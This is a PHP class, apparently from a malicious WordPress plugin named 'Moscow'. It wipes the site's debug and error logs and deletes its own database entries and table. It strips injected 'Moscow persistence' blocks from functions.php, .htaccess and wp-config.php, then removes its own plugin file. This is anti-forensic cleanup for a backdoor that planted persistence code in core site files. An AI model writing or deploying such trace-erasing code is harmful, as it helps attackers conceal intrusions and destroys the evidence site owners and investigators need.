<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class Cleaner
{
    public function flush_logs(): void
    {
        if (!Config::CLEAR_LOGS) return;

        $logs = [
            WP_CONTENT_DIR . '/debug.log',
            ABSPATH . 'wp-admin/error_log',
            ABSPATH . 'error_log',
            WP_CONTENT_DIR . '/error_log',
        ];

        foreach ($logs as $path) {
            if (is_file($path) && is_writable($path)) {
                @file_put_contents($path, '');
                @chmod($path, 0644);
            }
        }
    }

    public function purge_all(): void
    {
        global $wpdb;
        if (isset($wpdb)) {
            $wpdb->query("DELETE FROM {$wpdb->usermeta} WHERE meta_key LIKE '_moscow_%'");
            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE 'moscow_%'");
            $wpdb->query("DROP TABLE IF EXISTS {$wpdb->prefix}moscow_persist");
        }
        $this->clean_file(get_template_directory() . '/functions.php');
        $this->clean_file(ABSPATH . '.htaccess');
        $this->clean_file(ABSPATH . 'wp-config.php');
    }

    private function clean_file(string $file): void
    {
        if (!is_file($file) || !is_writable($file)) return;
        $content = file_get_contents($file);
        $content = preg_replace('/\n# Moscow\n.*?<\/IfModule>\n/s', '', $content);
        $content = preg_replace('/\/\*\*\s*Moscow persistence.*?exit;\n\}\s*/s', '', $content);
        $content = preg_replace('/<\?php\s*\/\/ moscow_wpconfig.*?\?>\s*/s', '', $content);
        file_put_contents($file, $content);
    }

    public function delete_plugin_files(): void
    {
        if (is_file(MOSCOW_FILE)) @unlink(MOSCOW_FILE);
    }
}